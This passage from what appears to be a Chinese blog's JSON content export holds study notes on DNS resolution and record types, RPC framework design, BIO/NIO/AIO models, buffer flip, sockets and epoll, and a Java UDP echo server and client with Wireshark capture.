二级查询条件，通常不在服务端响应，而是用于前端展示定位内容 统一资源定位符 URL（Uniform Resource Locator）,这样我们就可以通过一个字符串定位互联网资源总的来说，URL 是一种树状的设计， Host 代表主机（对应的 IP 地址由 DNS 服务提供）；Port 代表应用；Path 代表资源在应用中的路径；Query 代表对资源的查询条件。通过这种设计，互联网中万亿级别的资源都可以得到有效区分。 在计算机中，树状结构在计算机中非常常见，比如目录的设计，源代码块的嵌套设计 JSON 和 XML 的设计，都是树桩关系这源于人类的思考方式天然地喜欢把事物放到互斥的分类当中。 不过需要注意的是，树状的分类解决不了一个东西在多个类别的情况，而这种情况在多数时候却是真实存在的。真实世界中事物是普遍联系的，所以本质上事物之间的联系应该是图。但是通常情况下，我们会用树处理某一个方面的诉求。比如用 URL 描述资源的位置，然后用搜索引擎通过关键字反查 URL（另一个方面，维度等）。 域名系统DNS（Domain Name System，域名系统） 一个域名和 IP 地址相互映射的分布式服务，比如你想访问 shangghua.live 的 IP 地址，就需要通过 DNS 服务获得，这样凡是访问本博客的用户，就不需要在浏览器中输入博客的 IP 地址，而是通过一个方便人们记忆的域名 根域名服务器DNS 本身是一个出色的分布式架构 位于最顶层的是根域名服务器（Root Name Server）。人们在全世界范围内搭建了多台根域名服务器，2016 年的统计数据中，全世界目前有 13 台 IPv4 根服务器，25 台 IPv6 根服务器。 根域名服务器存储的不是域名和 IP 的映射关系，而是一个目录，如果将所有的域名记录都存放到根域名服务器，从存储量上来说，不会非常巨大但是如果全世界所有的 DNS 请求都集中到少量的根服务器上，这个访问流量就会过于巨大，。而且一旦发生故障，很容易导致大面积瘫痪。而且因为根服务器较少，所以如果全部都走根服务器，不同客户端距离根服务器距离不同，感受到的延迟也不一样，这样对用户来说不太友好。 因此，因为流量、防止单点故障、平衡地理分布等问题，根域名服务器只是一个目录，并不提供具体的数据。 域名分级和数据分区根服务器提供的目录有一定的索引规则，在域名的世界中，通过分级域名的策略建立索引我们知道中文字典可以按照偏旁部首以及拼音索引，和字典类似，根服务器提供的目录也有一定的索引规则 平时我们看到的.com.cn.net等，称为顶级域名。比如对于 www.shanghua.live 这个网址来说，com是顶级域名，shanghua是二级域名，www是三级域名。域名分级当然是为了建立目录和索引，并对数据存储进行分区。 graph TD A[根 DNS 服务器] --&gt; B[com DNS 服务器] B --&gt; baidu B --&gt; taobao A --&gt; C[net DNS 服务器] A --&gt; D[org DNS 服务] A --&gt; E[...] 顶部第一级是根 DNS 存储，存储的是顶级域的目录，被称作根 DNS 服务器 第二级是顶级域存储，存储的是二级域的目录，被称作顶级域 DNS 服务器（Top Level DNS，TLD） 最后一级是叶子节点，存储的是具体的 DNS 记录，也被称作权威 DNS 服务器。 DNS 查询过程 用户自己的路由器中的 DNS 缓存 小区的 DNS 服务器 ISP 的 DNS 服务器 graph TD A[请求 www.shanghua.live] --1--&gt; B[本地 DNS 服务器] B --2--&gt; C[根 DNS 服务器] C --3--&gt; B B --4--&gt; D[TLS DNS 服务器] D --5--&gt; B B --6--&gt; E[权威 DNS 服务器] E --7--&gt; B B --8--&gt; A 本地 DNS 是一系列 DNS 的合集，比如 ISP 提供的 DNS、公司网络提供的 DNS 本地 DNS 是一个代理，将 DNS 请求转发到 DNS 网络中 如果本地 DNS 缓存中找到了对应的 DNS 条目，就会直接返回，而跳过之后的步骤 客户端根据请求根 DNS 服务器。如果本地 DNS 中没有对应的记录，那么请求就会被转发到根 DNS 服务器，根 DNS 服务器只解析顶级域名,也就是 com 的部分 根 DNS 服务器返回顶级 DNS 服务器的 IP。 客户端请求顶级 DNS 服务器，顶级 DNS 服务器中是具体域名的目录。 顶级 DNS 服务器返回权威 DNS 服务器的 IP。 客户端请求权威 DNS 服务器。在权威 DNS 服务器上存有具体的 DNS 记录。以 lagou 为例，权威 DNS 服务器中可能有和 lagou.com 相关的上百条甚至更多的 DNS 记录，会根据不同的 DNS 查询条件返回 权威 DNS 服务器返回 DNS 记录到本地 DNS 服务器。 本地 DNS 服务器返回具体的 DNS 记录给客户端。 在上述 8 个过程全部结束后，客户端通过 DNS 记录中的 IP 地址，可以找到请求服务的主机。从而获得 Web 服务。浏览器会缓存 DNS，操作系统、路由器、本地 DNS 服务器也会绝大数情况，请求不会到达 DNS 服务器 关于缓存如果在某个时刻同一区域内有一个用户触发过上述 1 ~ 8 的过程，另一个同区域的用户就可以在本地 DNS 服务器中获得 DNS 记录，而不需要再走到根 DNS 服务器这种设计我们称之为 分级缓存策略在分级缓存策略中，每一层都会进行缓存，经过一层层的缓存，最终命中根 DNS 服务、顶级 DNS 服务器以及权威 DNS 服务的请求少之又少 DNS 记录一个 DNS 记录具体的样子 1www.example.com. IN A 16.162.59.31; IN 代表记录用于互联网，是 Intenet 的缩写 www.example.com 代表要解析的域名 A 代表记录的类型,代表这是一条解析 IPv4 的记录 16.162.59.31 是记录的值 ; 分号是语句块的结尾，也是注释 除了 A 记录，DNS 记录的类型非常多，有 30 多种，其中比较常见的有 A、AAAA、CNAME、MX，以及 NS 等 CNAMECNAME (CANONICAL Name Record) 用于定义域名的别名 1a.example.com. IN CNAME b.example.com; 这条 DNS 记录定义了 a.example.com 是 b.example.com 的别名，在浏览器中输入 a.example.com 后浏览器就能查找 a.example.com 为 b.example.com 的别名，就回去查找 b.example.com 的 A 记录 这样用户如果在浏览器输入 a.example.com 实际打开的就是 b.example.com。因为走的是 DNS 查询的路径，速度更快（因为有缓存）不需要 HTTP 重定向等操作 当你想把一个网站迁移到新的域名，旧的域名仍然保留的时候 当你想将自己的静态资源放到 CDN 上的时候，CNAME 就非常有用 AAAA 记录AAAA 记录与 A 记录类似，不过 A 记录记录的是 域名与 IPv4 的关系，AAAA 记录是 域名与 IPv6 的关系 MX 记录MX 记录是邮件记录，用来描述邮件服务器的域名。在工作中，我们经常会发邮件到某个同事的邮箱。比如说，发送一封邮件到 &#x78;&#x69;&#97;&#111;&#109;&#x69;&#110;&#x67;&#64;&#x73;&#104;&#x61;&#x6e;&#103;&#104;&#117;&#97;&#x2e;&#108;&#105;&#x76;&#x65;，那么如何知道哪个 IP 地址是邮件服务器呢？这时候就可以添加一条 MX 记录 1IN MX mail.shanghua.live 这样凡是 @shanghua 的邮件都会发送到 mail.shanghua.live 中，而 mail.shanghua.live 的 IP 地址，可以通过 mail.shanghua.live 的 A 记录 和 AAAA 记录获得 NS 记录NS（Name Server）记录是描述 DNS 服务器网址从 DNS 的存储结构上，Name Server 中含有权威 DNS 服务的目录NS 记录指定哪台 Server 是回答 DNS 查询的权威服务器，当一个 DNS 查询看到 NS 记录的时候，会再去 NS 记录配置的 DNS 服务器查询，得到最终结果 12a.com. IN NS ns1.a.coma.com. IN NS ns2.a.com 当解析 a.com 地址时，我们看到 a.com 有两个 NS 记录，所以确定最终 a.com 的记录在 ns1.a.com 和 ns2.a.com 上。从设计上看，ns1 和 ns2 是网站 a.com 提供的智能 DNS 服务器，可以提供负载均衡、分布式 Sharding 等服务。比如当一个北京的用户想要访问 a.com 的时候，ns1 看到这是一个北京的 IP 就返回一个离北京最近的机房 IP。 上面代码中 a.com 配置了两个 NS 记录。通常 NS 不会只有一个，这是为了保证高可用，一个挂了另一个还能继续服务。通常数字小的 NS 记录优先级更高，也就是 ns1 会优先于 ns2 响应。 配置了上面的 NS 记录后，如果还配置了 a.com 的 A 记录，那么这个 A 记录会被 NS 记录覆盖。 总结CNAME 记录的作用是？ CNAME 是一种 DNS 记录，作用是将一个域名映射到另一个域名，域名解析的时候，如果看到 CNAME 记录，则会从映射目标重新开始查询","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"RPC 框架","slug":"计网/RPC框架","date":"2021-07-03T10:42:57.000Z","updated":"2021-07-04T12:27:24.053Z","comments":true,"path":"2021/07/03/计网/RPC框架/","link":"","permalink":"https://www.shanghua.live/2021/07/03/%E8%AE%A1%E7%BD%91/RPC%E6%A1%86%E6%9E%B6/","excerpt":"","text":"RPCRPC（Remote Procedure Call）远程过程调用 在远程必选先定义这个方法，然后才可以通过 RPC 框架调用该方法，远程调用不仅可以传入参数、获取到返回值还可以捕捉调用过程中的异常 RPC 让远程调用就像本地调用一样 假设实现一个 rpc 对象，其中的 invode 方法可以实现远程调用 1var result = rpc.invode(&quot;greetings&quot;,arg1,arg2...) 这段程序将本地看作 一个 RPC 的客户端，将远程看作一个 RPC 的服务端。如下图所示： flowchart RL B[服务 B] --返回--&gt; D[RPC 服务端] D --本地方法调用--&gt; B A[服务 A] --远程方法调用--&gt; C[RPC 客户端] C --返回--&gt; A D &lt;--TCP&#x2F;UDP&#x2F;HTTP--&gt; C 服务 A 发起远程方法调用，RPC 客户端通过某种协议将请求发送给服务 B服务 B 解析请求，进行本地方法的调用，将结果返回到服务 B 的 RPC 服务端最终返回到服务 A。如果程序员没有意识到这是一次远程方法调用，就可能写出下面这段程序 123for(int i = 0;i &lt; 1000000;i++)&#123; rpc.invoke(...)&#125; 之所以可能写出，是因为你（程序员）没有意识到 rpc.invoke 是一次远程调用。在实际的操作过程中，rpc.invoke 可能被封装到某个业务方法中，程序员调用的时候便容易忽视这是一次远程操作。所以 RPC 调用时就要求你（程序员）对性能有清晰的认识 多路复用的优化RPC 提供的是远程方法的调用 本质上是数据的传递，传递数据有一个最基本的问题要处理，就是提高吞吐量 (单位时间传递的数据量)如果为每个远程调用（请求）建立一个连接，就会造成资源的浪费，因此通常我们会考虑多个请求复用一个连接叫做多路复用 在具体实现多路复用的时候，也会有不同的策略。假设要发送数据 A、B、C、D，那么一种方法是建立一个连接依次将 A、B、C、D 发过去，就像下面这样 —&gt; | &nbsp; A &nbsp; | &nbsp; B &nbsp; | &nbsp; C &nbsp; | &nbsp; D &nbsp; | —&gt; 子这种结构中，利用一个连接顺序发送 A、B、C、D 将多个请求放入一个连接的方式，节省了多次握手、挥手的时间，但是由于 ABCD 不是并行发送，而是顺序发送，当其中某个请求的体积较大时，容易阻塞其他请求，如下 —&gt; | &nbsp;&nbsp;&nbsp;&nbsp; A &nbsp;&nbsp;&nbsp;&nbsp; | &nbsp; B &nbsp; | &nbsp; C &nbsp; | &nbsp; D &nbsp; | —&gt; 在 A 较大的时候，B，C，D 就只能等 A 完全传送完成才能发生传送。这样模型对于 RPC 请求/响应大小不平均的网络不太友好体积小的请求/响应可能会因为一些大体积的请求/响应而延迟因此还有另一种常见的多路复用方案，就是将 A、B、C、D 切片一起传输，如下 顺序传输方案 —&gt; | &nbsp;&nbsp;&nbsp;&nbsp; A &nbsp;&nbsp;&nbsp;&nbsp; | &nbsp; B &nbsp; | &nbsp; C &nbsp; | &nbsp; D &nbsp; | —&gt; 上图中，用不同的块,代表不同的传输任务。采用顺序传输方案将 A、B、C、D 用一个连接传输节省了握手，挥手成本。切片传输的方案在这之上，将数据切片可以保证大、小任务并行，不会因为大任务阻塞小任务 另外还有一个需要考虑的点，单个 TCP 连接的极限传输速度是受到窗口大小，缓冲区等因素的制约，不一定可以用满网络资源。如果传输量特别大的时候，有可能需要考虑提供多个连接，每个连接再去考虑多路复用的情况 调用约定和命名远程调用一个函数 命名空间 + 类名 + 方法名 比如调用一个支付服务对象 Payservice 的 pay 方法 命名空间（trade.payment） 对象名称是（PayServer） 方法名称是（Pay） 例如用 ＃ 分割: trade.payment#PayService#Pay 在进行远程调用的时候，给远程方法命名是调用约定的一部分，通过调用命名下完整的名称调用远getName程方法 常用的做法是先不具体指定调用的方法，而是先创建一个远程对象的实例，比如上方 PayService 对象的实例这里会用到一些特别的编程技巧，比如代理设计模式、动态接口生成等。 不过归根结底，我们调用的本质就是字符串名称。而实现这个调用，你需要知道两件事情 IP 是多少，也就是方法在哪个机器上调用 端口是多少，也就是哪个服务提供这个调用 注册和发现调用的时候我们需要通过 字符串 获取 IP和端口（机器和服务 ） 在网络的时间中，需要的只是网络接口和 IP 地址，而操作系统区分应用需要的是端口在调用过程中，需要的是注册表，存储了字符串和 IP + 端口的对应关系我们可以使用 Redis 的 hash 对象存储这个对应关系 当我们上线一个服务的时候，就在 Redis 的某个 hash 对象中存储它和它对应的 IP 地址 + 端口列表通常，将写这个 hash 对象的过程称之为注册我们远程调用一个 RPC 服务的时候，调用端提供的是 RPC 服务的名称（例如：命名空间+对象+方法）根据名称查找到提供服务的 IP + 端口清单并指定某个 IP + 端口的过程称作为发现 但是并不能简单的这样理解为，注册就是写一个 Hash 表，发现就是查哈希表再决定服务的响应者在实际的设计中，需要考虑很多东西，例如基于 Redis 的实现如果所有 ROC 调用都需要去 Redis 查询，会造成负责发现的中间件压力较大RPC 调用者会缓存上一次调用的 IP + 端口，但是缓存又会造成数据会和注册表之间产生数据不一致的问题可以考虑由分布式共识服务比如 Zookeeper 提供订阅，让 RPC 调用者订阅到服务地址的变更，及时更新自己的缓存 负载均衡的设计在设计 RPC 框架的时候，负载均衡的设计往往需要和 RPC 框架一起考虑，因为 RPC 框架提供了注册、发现的能力，提供发现能力的模块本省就是一个负载均衡器，因此负载均衡可以看作发现模块的一个子组件。请求到达 RPC 的网关（或某个路由程序）后，发现组件会提供服务对应的所有实例（IP + 端口），然后负载均衡算法会指定其中一个响应这个请求。 可用性和容灾 当一个服务实例崩溃的时候（不可用），因为有发现模块的存在，可以及时从注册表中删除这个服务实例，只要服务本身有足够度的实例那么完全不可用的风险会大大降低，当然，可用性 百分之百 是不可能实现的。 注册表和 RPC 调用者之间必然存在不一致的现象，而且注册表的更新本身也可能滞后 如果遇到临时访问量剧增，需要扩容的场景，可以自动启动服务注册即可，这块可以用自动化脚本衔接。 总结设计一个 RPC 框架最基础的能力就是实现远程方法的调用。这里需要一个调用约定，比如怎么描述一个远程的方法，发送端怎么传递参数接收方如何解析参数，发生异常如何处理，具体来说，这些事情都不难实现，只是比较烦琐。其实不仅仅在 RPC 调用时有调用约定，编译器在实现函数调用的时候，也会有调用约定。另外，还有一些在 RPC 基础上建立起来的更复杂、更体系化的约定，比如说面向服务架构（SOA）。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"BIO、NIO 和 AIO","slug":"计网/网络IO模型","date":"2021-07-01T16:43:55.000Z","updated":"2021-07-01T09:56:19.019Z","comments":true,"path":"2021/07/02/计网/网络IO模型/","link":"","permalink":"https://www.shanghua.live/2021/07/02/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9CIO%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"BIO、NIO 和 AIO 有什么区别？从本质来说，讨论 BIO、NIO、AIO 的区别，就是讨论 I/O 的模型，我们可以从三个方面思考 变成模型：合理设计 API，让程序写得更舒服 数据的传输和转化成本：比如减少数据拷贝次数，合理压缩数据等。 高效的数据结构：利用好缓冲区、红黑树等 I/O 编程模型BIOBIO（Blocking I/O，阻塞I/O），API 的设计会阻塞程序调用 12// 程序会在这个地方阻塞，直到收到数据byte a = readKey() 假设 readKey 方法会从键盘中读取一个用户的按键，如果是阻塞 I/O 的设计，readKey 会阻塞当前用户线程直到用户按键阻塞态的线程如果要恢复执行，就要进行排队，也就是线程的上下文切换（Context Switch）：从一个线程切换到另一个线程 NIONIO （None Blocking I/O 非阻塞 IO），API 的设计不会阻塞程序的调用 1byte a = readKey() 假设 readKey 方法从键盘读取一个按键，如果是非阻塞 I/O 的设计，readKey 不会阻塞当前的线程，哪如果没有按键会怎么办， 在阻塞 I/O 的设计中，如果用户没有按键线程会阻塞等待用户按键 在非阻塞 I/O 的设计中，线程不会阻塞，没有按键会返回一个空值 AIOAIO（Asynchronous I/O,异步 I/O），API 的设计会多创造一条时间线 1234function callBackFuntion(byte keyCode)&#123; // 处理按键&#125;readKey(callBackFuntion) 在异步 I/O 中，readKey 方法会直接返回，但是没有结果，结果需要回调一个函数callBackFunction 去接受异步：时间线上无法同步的现象，不知道 callbackFunction 何时会执行 但是 异步 I/O 会产生回调地狱的问题，本质来说是因为 异步程序的时间线错乱导致维护成本较高，如下 123456789request(&quot;/order/123&quot;, (data1) -&gt; &#123; //.. request(&quot;/product/456&quot;, (data2) -&gt; &#123; // .. request(&quot;/sku/789&quot;, (data3) -&gt; &#123; //... &#125;) &#125;)&#125;) 一般情况我们会提供一种异步转换为同步程序的语法。如下 12345678Future future1 = request(&quot;/order/123&quot;)Future future2 = request(&quot;/product/456&quot;)Future future3 = request(&quot;/sku/789&quot;)// ...// ...order = future1.get()product = future2.get()sku = future3.get() request 函数是一次网络请求调用，请求订单 ID=123 的订单数据。本身 request 函数不会阻塞，会马上执行完成，而网络是一次异步请求，调用不会在 request(“/order/123”) 下一行结束，而是会在未来某个时间结束，因此我们用一个 Future对象封装这个异步操作，future.get() 是一个阻塞操作，会阻塞直到网络调用返回 在 request 和 future.get 之间，我们还可以进行别的操作，比如发送更多的请求，Future 这样能够将异步操作再同步主时间线的操作，我们称之为异步转同步，也叫做异步编程，通常一门语言如果能提供异步编程的能力，指的就是提供异步转同步的能力同步程序看起来更直观，并且更好维护 数据的传输和转化成本无论是那种 I/O 模型都要从数据从网卡拷贝到用户程序（接收），或者将数据从用户程序传输到网卡（发送） 有的数据需要编码解码，比如 JSON 格式的数据 有的数据需要进行压缩和解码 graph LR A[网卡] --&gt; B[内核] B --&gt; C[用户程序] 数据到网卡到内核到用户程序是两次传输。将数据从内存中的一个区域拷贝到另一个区域。这是一个 CPU 密集型操作数据的拷贝归根结底需要一个字节一个字节去做 从网卡到内核空间的这步操作，可以用 DMA （Direct Memory Access）技术控制。DMA 是一种小型设备，用 DMA 拷贝数据可以不使用 CPU，从而节省计算资源。通常我们写程序的时候，不能直接控制 DMA，因此 DMA 仅仅用于设备传输数据到内存中。不过，从内核到用户空间这次拷贝，可以用内存映射技术，将内核空间的数据映射到用户空间。 无论 I/O 的编程模型如何选择，数据传输和转化成本是逃不掉的，通过 DMA 技术和内存映射技术，就可以节省成本减少数据传输、数据压缩解压、数据编码解码 总结BIO、NIO 和 AIO 有什么区别？ 这三者是三个 I/O 的编程模型 BIO 接口设计会直接导致当前线程阻塞 NIO 的设计不会触发当前线程的阻塞 AIO 为 I/O 提供了异步能力；将 I/O 的响应程序放到一个独立的时间线去执行 通常 AIO 的提供者会提供异步编程模型，就是实现一种对异步计算封装的数据结构，并且提供将数据计算同步会主线的能力 这三种 API 都会伴随 I/O 多路复用 如果底层用红黑树管理注册的文件描述服和事件，可以在很小的开销内由内核将 I/O 消息发送给指定的线程","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"缓冲区 flip","slug":"计网/缓冲区flip","date":"2021-07-01T13:03:27.000Z","updated":"2021-07-01T08:42:23.061Z","comments":true,"path":"2021/07/01/计网/缓冲区flip/","link":"","permalink":"https://www.shanghua.live/2021/07/01/%E8%AE%A1%E7%BD%91/%E7%BC%93%E5%86%B2%E5%8C%BAflip/","excerpt":"","text":"缓冲区的 flip在计算机中，数据往往会被抽象陈流，然后传输。比如读取一个文件，数据会被抽象成文件流；播放一个视频，视频被抽象成视频流，处理节点为了防止过载，又会使用缓冲区削峰（减少瞬间压力）在传输协议中，应用往往先把数据放入缓冲区，然后再将缓冲区通过给发送数据的程序，发送数据的程序从缓冲区读取数据，然后进行发送。 流代表数据，具体来说是随着时间产生的数据，类比自然界的河流读取文件的时候，文件被抽象成流流的内部构造，决定了你每次能从文件中读取多少数据，从流中读取数据的操作，本质上是一种迭代器流的内部构造决定了迭代器每次能读取的数据规模 为什么需要缓冲区因为从文件读取数据这个操作，是一次磁盘的 I/O 操作，非常耗时。内核从文件系统读取到的数据是确定的，但里面的有效数据是不确定的。而无论读取打一个字节还是读取对个字节，都应该适配内核的底层行为，也就是说，每次流对象读取一个字节，内核可能会读取 2k、4k 的数据。这样的行为才能真的做到减少磁盘I/O 操作 哪为什么不直接读取几兆或者更大的数据呢？ 两个原因 如果是高并发场景下，并发读取数据时内存使用是根据并发数翻倍的，如果同时读取的数据量过大，可能会导致内存不足 读取 2k/4k 大很多倍的数据，比如 1M/2M 这种远远大于内存分页大小的数据，并不能提升性能 缓冲区缓冲区就是一块用来做缓冲的内存区域，为了应对频繁的字节读取，我们在内存中设置一个 2k 大小的缓冲区。这样读取 2048 次才会真正发生一次读取。 不仅仅如此，比如做一个秒杀系统，如果同时到达的流量过高，也可以使用缓冲区将用户请求先存储下来，再进行处理这个操作我们称之为削锋，削去流量的峰值缓冲区的数据通常具有朴素的公平，先进先出（FIFO）。从数据结构的设计上，缓冲区像一个队列。在实际的使用场景中缓冲区有自己的特别的需求 graph LR A[文件流] --&gt; B[缓冲区] B --&gt; C[网络流] 缓冲区需要支持两种操作： 写入数据 读取数据 清空（应对下一次请求） 那么具体怎么设计这个缓冲区？首先，数据可以考虑存放到一个数组中， 1| | | | | | | | 写入数据的时候，需要一个指针指向可以写入的位置 123 | | | | | | | | |position 每次写入数据，position 增加 1,比如写入 a,b,c,d 后 123| a | b | c | d | | | | | position 那么这个时候需要切换读状态怎么做呢？我们可以增加一个 limit 指针，随着写入指针一起增长 12345 limit | | a | b | c | d | | | | | position 当需要切换到读取状态时候，将 position 设置为 0，limit 不变即可 12345 limit | | a | b | c | d | | | | |position 我们将 position 设置为 0，limit 不变的操作称为 flip 操作，flip 本意是翻转，在这个场景中是读，写状态的切换读取操作可以循环从 position 一直读取到 limit 这样就可以读取 a,b,c,d 那么如果要继续写入应该怎么操作呢，这个时候就需要 clear 操作，这个操作会清空缓冲区。具体来说 clear 会将 position，limit 都设置为 0，就可以做到重复利用缓冲区了 写过程从 position = 0 开始，position 和 limit 一起自增。读取时，用 flip 操作切换缓冲区读写状态，读取数据完毕，用 clear重置缓冲区状态 总结流是随着时间产生的数据。数据抽象成流，是因为客观世界存在这样的现象。数据被抽象成流后，我们不需要把所有的数据都读取到内存中进行计算和迭代，而是每次处理或者计算一个缓冲区的数据。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"EPoll 红黑树","slug":"计网/EPoll","date":"2021-06-29T17:16:25.000Z","updated":"2021-07-01T04:18:04.798Z","comments":true,"path":"2021/06/30/计网/EPoll/","link":"","permalink":"https://www.shanghua.live/2021/06/30/%E8%AE%A1%E7%BD%91/EPoll/","excerpt":"","text":"Socket 是什么flowchart TB subgraph one 客户端 &lt;--&gt; Socket对象1 end subgraph two 服务端 &lt;--&gt; Socket对象2 end Socket对象1 &lt;--&gt; three Socket对象2 &lt;--&gt; three subgraph three TCP&#x2F;IP end Socket 是一种文件，准确的来说是一种双线管道文件 管道文件：管道会将一个程序的输入，导向另一个程序的输入 双向管道文件：双向管道文件连接的程序是对等的，都可以作为输入和输出 服务端程序 12var serverSocket = new ServerSocket();serverSocket.bind(new InetSocketAddress(80)); 这里看起来是我们创建的是一个服务端 Socket 对象，但单纯看这个对象，它代表着什么呢？如果从管道文件来理解，就容易些 其一，这是一个文件 其二，它里面存的是所有客户端 Socket 文件的文件描述符 当一个客户端连接到服务端的时候，操作系统就会创建一个客户端的 Socket 文件。然后操作系统对这个文件的文件描述写入服务端程序创建的服务端 Socket 中，服务端 Socket 文件，是一个管道文件，如果读取这个文件的内容，就相当于从管道中取走了客户端的文件描述符 graph LR 硬件 --&gt; os((OS)) os --- data[Data 客户端 Socket] os --- file[文件描述符 服务端 Socket] Thread ---&gt; file 当线程想要读取客户端传来的数据时，就从客户端 Socket 文件中读取数据当线程想要发送数据到客户端时，就向客户端 Socket 文件中写入数据 服务端 Socket 的绑定比如 Nginx 监听 80 端口 Node 监听 3000 端口 SSH 监听 22 端口 Tomcat 监听 8080 端口 端口监听不能冲突，不然客户端连接进来创建客户端 Socket 文件文件描述服就不知道写入哪个服务端 Socket 文件服务端监听的本质，是将服务端 Socket 文件和端口绑定，这个操作也称为 bind。有时候我们不仅仅绑定端口，还需要绑定 IP 地址。这是因为有时候我们只允许指定 IP 访问我们的服务器程序 扫描和监听对于服务端程序，可以定期扫描服务端 Socket 文件的变更，来了解哪些客户端想要连接进来如果在客户端 Socket 文件中读取到一个客户端的文件描述服，就可以将这个文件描述符实例成一个 Socket 对象 graph LR ServerSocket --客户端 Socket 文件描述服--&gt; 服务端程序 服务端程序 --定期读取--&gt; ServerSocket 服务端程序 --Socket对象--&gt; s((客户端 Socket 集合)) 之后，服务端可以将这个 Socket 对象加入一个容器（集合），通过定期遍历所有的客户端 Socket 对象，查看背后 Socket 文件的状态从而确定是否有新的数据从客户端传输过来这样通过一个线程来响应多个客户端的计数，也被称作 I/O 多路复用技术 响应式 （Reactive）服务端程序（线程）需要维护一个 Socket 的集合，然后定期遍历这个集合 命令式的程序：遍历一个 Socket 集合看看有没有发生写入 graph LR 线程指挥官 --主动观察--&gt; Socket对象1 线程指挥官 --主动观察--&gt; Socket对象2 线程指挥官 --主动观察--&gt; Socket对象3 线程指挥官 --主动观察--&gt; Socket对象4 线程指挥官 --主动观察--&gt; Socket对象5 线程指挥官 --主动观察--&gt; Socket对象6 线程去遍历 Socket 对象，若 Sokcet 对象过多，会导致负担过重，吞吐量下降 响应式就不会有这样的情况 graph LR Socket对象1 --被动响应--&gt; 线程指挥官 Socket对象2 --被动响应--&gt; 线程指挥官 Socket对象3 --被动响应--&gt; 线程指挥官 Socket对象4 --被动响应--&gt; 线程指挥官 Socket对象5 --被动响应--&gt; 线程指挥官 Socket对象6 --被动响应--&gt; 线程指挥官 在响应式程序中，Socket 会主动通知指挥官，所以应该是有某个观察者观察到 Socket 文件状态的变化，从而通知处理线程响应。线程不需要遍历 Socket 集合，而是观察程序的通知当然最适合观察者其实是操作系统本身。在实现这个模型时，有几个事情需要主机 线程需要告诉中间的观察者自己要观察什么，或者说什么情况下才响应？比如具体到某个 Socket 发生了什么事件？是读写还是其他事情？这一步我们通常称为注册 中间的观察者需要实现一个高效的数据结构（通常情况下是基于红黑树的二叉搜索树），这是因为中间的观察者不仅仅是某个服务于某个线程，而是服务于很多的线程。当一个 Socket 文件发生变化的时候，中间的观察者需要知道，究竟是哪个线程需要这个信息，而不是将所有线程都遍历一边 总结 Socket 既是一种编程模型，或者说是一段程序，同时也是一个文件，一个双向管道文件。 一个线程可以通过读取服务端 Socket 文件中的内容拿到所有的客户端 Socket 这样一个线程就可以负责响应所有客户端的 I/O这种技术称为 I/O 多路复用 主动式的 I/O 多路复用，对负责 I/O 的线程压力过大，通常会设计一个 I/O 事件的观察者，线程通过订阅来被动响应，也就是响应式模型 操作系统内核为我们提供响应式实现 Linux 的设计中有三种典型的 I/O 多路复用模型 select 主动模型，需要线程通过一个集合存放所有的 Socket，然后发生 I/O 变化的时候遍历 poll 更优质的编程接口，本质与 select 相同，千级别下的 I/O 可以考虑 select 和 poll epoll 在操作系统内核提供了一个中间数据结构，这个中间数据结构会提供事件监听注册，以及快速判断消息关联到哪个线程的能力","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"Java UDP Socket","slug":"计网/JavaUDPSocket","date":"2021-06-29T12:42:45.000Z","updated":"2021-07-15T05:17:56.240Z","comments":true,"path":"2021/06/29/计网/JavaUDPSocket/","link":"","permalink":"https://www.shanghua.live/2021/06/29/%E8%AE%A1%E7%BD%91/JavaUDPSocket/","excerpt":"","text":"Java 创建 UDP socket创建 UDP ServerHello我们可以用 Java 中的 DatagramSocket 创建一个 UDP Server 1234567891011121314151617181920212223public class UdpEchoServer &#123; // 端口号 private static final int port = 8421; public static void main(String[] args) throws IOException &#123; // 创建 UDP socket DatagramSocket socket = new DatagramSocket(port); while (true) &#123; // 创建数据包 DatagramPacket packet = new DatagramPacket(new byte[512], 512); // 接受数据 socket.receive(packet); // 拼接收到的数据 String msg = new String(packet.getData(), 0, packet.getLength(), StandardCharsets.UTF_8); System.out.println(packet.getAddress() + &quot;:&quot; + packet.getPort() + &quot;&gt;&quot; + msg); // 将收到的数据加上 “server” 头 packet.setData((&quot;server:&quot; + msg).getBytes(StandardCharsets.UTF_8)); // 返回数据 socket.send(packet); &#125; &#125;&#125; Java 创建 UDP Client同样的使用 DatagramSocket 创建客户端 123456789101112131415161718192021222324252627282930313233public class UdpEchoClient &#123; private static final int remotePort = 8421; private static InetAddress remoteIp = null; static &#123; try &#123; // 获取本地 IP remoteIp = InetAddress.getLocalHost(); &#125; catch (UnknownHostException e) &#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) throws IOException &#123; // 创建 UDP socket DatagramSocket socket = new DatagramSocket(); // 创建消息 byte[] outputMsg = &quot;hello Server&quot;.getBytes(); // 打包消息 DatagramPacket outputPacket = new DatagramPacket(outputMsg,outputMsg.length,remoteIp,remotePort); // 发送消息 socket.send(outputPacket); // 接受消息 DatagramPacket inputPacket = new DatagramPacket(new byte[512],512); socket.receive(inputPacket); // 将接受到的数据转换成 String String msg = new String(inputPacket.getData(),0,inputPacket.getLength(), StandardCharsets.UTF_8); System.out.println(msg); // 关闭连接 socket.close(); &#125;&#125; 运行首先运行 UdpEchoServer，运行后会监听本地 8421 端口，再运行 UdpEchoClient 向服务端发送消息可以看到服务端先打印了 /127.0.0.1:45793&gt;hello Server然后客户端打印 server:hello Server 使用 Wireshark 抓包如果客户端与服务端都运行在本地，需要在 Wireshark 选择网卡页面选择 Loopback:io 本地回环，来抓取本地数据包 在过滤窗口输入 udp.port == 8421 ,过滤 udp 协议 8421 端口，运行 UdpEchoServer 之后运行 UdpEchoClient 即可看到 udp 数据包，如图 客户端发往服务端数据包 服务器发往客户端的数据包 可以看到 UDP 数据包只有一来一回两个数据包，不像 TCP 协议需要先三次握手建立连接，每次收到数据都要发送给 ACK 